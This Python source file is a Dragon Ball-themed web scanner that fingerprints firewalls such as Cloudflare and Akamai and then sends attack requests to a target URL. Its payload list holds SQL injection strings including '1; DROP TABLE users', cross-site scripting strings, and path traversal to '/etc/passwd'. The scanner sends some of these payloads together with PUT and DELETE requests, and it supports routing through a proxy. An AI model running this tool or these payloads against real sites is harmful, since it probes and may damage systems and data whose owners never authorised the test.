import aiohttp
import asyncio
import re
import json
import logging
import csv
import concurrent.futures
from urllib.parse import urlparse
from typing import Dict, Optional, List
from time import perf_counter
import argparse
from pathlib import Path
import random
from tqdm.asyncio import tqdm
import yaml

# Dragon Ball-themed ASCII art header
DRAGON_BALL_ART = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣶⣶⣶⣶⣶⣶⣶⡆⠀⢠⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⣿⣿⣿⣿⣿⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⡟⠁⠀⠀⣼⣿⣿⣿⡿⠿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⠁⠀⠀⠀⣿⣿⠟⠁⠀⠀⠀⠀⠀⠉⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠟⠀⠀⠀⢰⠟⠁⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡭⠭⠙⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⡤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡇⠀⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣉⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣤⣤⣤⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠀⠀⠀⠀⠀⣀⣠⣴⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣷⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠿⠋⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣾⡆⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⢀⣀⣼⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⡿⠀⢀⣾⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⠀⢸⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⡄⠀⠙⠿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣾⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣦⣤⣀⡀⠀⠀⢀⣀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣾⣿⣿⡄⠀⢻⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⡿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⡇⠀⠘⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

# Configure logging with Dragon Ball flair
logging.basicConfig(level=logging.INFO, format='%(asctime)s - Z-FIGHTER - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Precompiled regex for WAF signatures
ENEMY_DEFENSES = {
    'Cloudflare': [re.compile(r'cf-ray|cloudflare|__cfduid', re.IGNORECASE)],
    'Akamai': [re.compile(r'akamai|kcdn', re.IGNORECASE)],
    'F5_BigIP': [re.compile(r'bigip|f5', re.IGNORECASE)],
    'Imperva': [re.compile(r'incapsula|imperva', re.IGNORECASE)],
    'Sucuri': [re.compile(r'sucuri|x-sucuri-id', re.IGNORECASE)],
    'AWS_WAF': [re.compile(r'aws-waf|x-amzn-waf', re.IGNORECASE)],
    'Wordfence': [re.compile(r'wordfence', re.IGNORECASE)],
}

# Malicious payload generator
PAYLOADS = {
    'SQLi': ["1 OR 1=1", "1; DROP TABLE users"],
    'XSS': ["<script>alert('SuperSaiyan')</script>", "javascript:alert('Goku')"],
    'LFI': ["../../etc/passwd", "../config.php"]
}

class SaiyanScanner:
    def __init__(self, target_url: str, config: Dict):
        self.target_url = target_url
        self.config = config
        self.timeout = config.get('timeout', 5)
        self.retries = config.get('retries', 2)
        self.rate_limit = config.get('rate_limit', 10)  # Requests per second
        self.proxy = config.get('proxy')
        self.waf_cache = {}
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)
        logger.info("Saiyan Scanner at Super Saiyan God level! Target: %s", target_url)

    async def sense_enemy_defense(self, response: aiohttp.ClientResponse, content: str) -> Optional[str]:
        """Sense WAF defenses with Ultra Instinct precision."""
        if self.target_url in self.waf_cache:
            return self.waf_cache[self.target_url]

        headers = response.headers
        cookies = response.cookies

        for defense_name, patterns in ENEMY_DEFENSES.items():
            # Check headers
            for header in headers.values():
                if any(pattern.search(header) for pattern in patterns):
                    self.waf_cache[self.target_url] = defense_name
                    return defense_name
            # Check cookies
            for cookie in cookies:
                if any(pattern.search(cookie.key) for pattern in patterns):
                    self.waf_cache[self.target_url] = defense_name
                    return defense_name
            # Check content (minimal, as it's slower)
            if any(pattern.search(content) for pattern in patterns):
                self.waf_cache[self.target_url] = defense_name
                return defense_name

        # Detect generic defenses or CAPTCHAs
        if response.status in [403, 429]:
            self.waf_cache[self.target_url] = "Unknown Barrier (Blocked)"
            return "Unknown Barrier (Blocked)"
        if 'captcha' in content.lower():
            self.waf_cache[self.target_url] = "CAPTCHA Defense"
            return "CAPTCHA Defense"

        self.waf_cache[self.target_url] = None
        return None

    async def kamehameha_request(self, session: aiohttp.ClientSession, technique: str, url: str, payload: Optional[Dict] = None, params: Optional[Dict] = None, attempt: int = 0) -> Dict:
        """Unleash a Kamehameha HTTP attack with maximum power!"""
        try:
            logger.debug(f"Charging {technique.upper()} Kamehameha on {url}!")
            start_time = perf_counter()
            async with session.request(
                method=technique,
                url=url,
                data=payload,
                params=params,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                proxy=self.proxy
            ) as response:
                content = await response.text() if response.status != 204 else ""
                battle_report = {
                    'technique': technique,
                    'target': url,
                    'battle_status': response.status,
                    'enemy_headers': dict(response.headers),
                    'enemy_cookies': dict(response.cookies),
                    'damage_dealt': len(content),
                    'saiyan_headers': dict(session._default_headers),
                    'battle_params': params,
                    'payload': payload,
                    'latency': perf_counter() - start_time
                }
                # Analyze defense asynchronously
                battle_report['enemy_defense'] = await self.sense_enemy_defense(response, content)
                if battle_report['enemy_defense']:
                    logger.info(f"Enemy defense detected: {battle_report['enemy_defense']}!")
                else:
                    logger.debug("No defenses sensed. Target vulnerable!")
                return battle_report

        except aiohttp.ClientError as e:
            if attempt < self.retries:
                logger.warning(f"Kamehameha disrupted: {e}. Retrying... ({attempt + 1}/{self.retries})")
                await asyncio.sleep(1)
                return await self.kamehameha_request(session, technique, url, payload, params, attempt + 1)
            logger.error(f"Kamehameha failed: {e}")
            return {'error': str(e), 'target': url, 'technique': technique}

    async def z_fighter_assault(self, session: aiohttp.ClientSession) -> List[Dict]:
        """Launch a coordinated Z Fighter assault with ultimate efficiency."""
        battle_results = []
        techniques = [
            ('GET', None, None, "Goku's Spirit Bomb"),
            ('GET', None, {'test': random.choice(PAYLOADS['SQLi'])}, "Vegeta's Final Flash"),
            ('POST', {'username': 'Goku', 'password': 'Kamehameha123'}, None, "Piccolo's Special Beam Cannon"),
            ('POST', {'input': random.choice(PAYLOADS['XSS'])}, None, "Gohan's Masenko"),
            ('PUT', {'key': 'SuperSaiyan'}, None, "Trunks' Burning Attack"),
            ('DELETE', None, None, "Krillin's Destructo Disc")
        ]

        # Rate-limited parallel requests
        semaphore = asyncio.Semaphore(self.rate_limit)
        async def limited_request(*args):
            async with semaphore:
                return await self.kamehameha_request(session, *args)

        tasks = []
        for tech, payload, params, name in techniques:
            logger.info(f"Unleashing {name} ({tech})!")
            tasks.append(limited_request(tech, self.target_url, payload, params))

        # Progress bar for epic battles
        for task in tqdm.as_completed(tasks, desc="Z Fighter Assault", total=len(tasks)):
            battle_results.append(await task)

        return battle_results

    def save_report(self, results: List[Dict], format: str, output_file: str):
        """Save battle report in JSON or CSV."""
        if format == 'json':
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            logger.info(f"Battle report saved as JSON: {output_file}")
        elif format == 'csv':
            if results:
                keys = results[0].keys()
                with open(output_file, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=keys)
                    writer.writeheader()
                    writer.writerows(results)
                logger.info(f"Battle report saved as CSV: {output_file}")

async def main(args):
    print(DRAGON_BALL_ART)
    logger.info("Z Fighters, power up! Dragon Radar locked on!")

    # Load configuration
    config = {
        'timeout': args.timeout,
        'retries': args.retries,
        'rate_limit': args.rate_limit,
        'proxy': args.proxy
    }
    if args.config:
        with open(args.config, 'r') as f:
            config.update(yaml.safe_load(f))

    # Load custom WAF signatures
    if args.waf_file:
        with open(args.waf_file, 'r') as f:
            custom_wafs = json.load(f)
            for name, patterns in custom_wafs.items():
                ENEMY_DEFENSES[name] = [re.compile(p, re.IGNORECASE) for p in patterns]
        logger.info("Custom WAF signatures loaded!")

    target_url = args.url
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
        logger.info("Adding Hyperbolic Time Chamber protocol: %s", target_url)

    scanner = SaiyanScanner(target_url, config)
    connector = aiohttp.TCPConnector(limit=50)  # Optimized connection pool
    async with aiohttp.ClientSession(connector=connector) as session:
        results = await scanner.z_fighter_assault(session)

    # Print or save results
    if args.output:
        scanner.save_report(results, args.output_format, args.output)
    else:
        for result in results:
            print("\n=== Z Fighter Battle Report ===")
            for key, value in result.items():
                print(f"{key}: {value}")
            print("======================")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Dragon Ball Z Saiyan Scanner for WAF Detection and HTTP Assault")
    parser.add_argument("url", help="Target URL (e.g., https://namek.com)")
    parser.add_argument("--timeout", type=float, default=5, help="Request timeout in seconds")
    parser.add_argument("--retries", type=int, default=2, help="Number of retries for failed requests")
    parser.add_argument("--rate-limit", type=int, default=10, help="Max requests per second")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:8080)")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--output-format", choices=['json', 'csv'], default='json', help="Output format")
    parser.add_argument("--waf-file", help="JSON file with custom WAF signatures")
    parser.add_argument("--config", help="YAML config file")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    asyncio.run(main(args))
